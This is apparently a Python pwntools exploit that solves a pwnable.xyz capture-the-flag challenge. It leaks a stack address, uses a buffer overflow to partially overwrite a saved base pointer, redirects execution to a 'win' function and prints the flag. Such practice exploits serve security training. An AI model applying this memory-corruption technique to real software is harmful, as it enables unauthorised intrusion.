from pwn import *

win = 0xb77

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30012)

p.sendlineafter('> ', '3')
envp = int(p.recvline().strip(), 16)
success('envp = 0x%x', envp)
rbp = envp - 248

p.sendafter('> ', b'a'*0x20 + p8((rbp&0xff)+9))
p.sendafter('> ', str(win&0xff))
p.sendafter('> ', b'a'*0x20 + p8(rbp&0xff))
p.sendafter('> ', '1')

print(p.recvuntil('}'))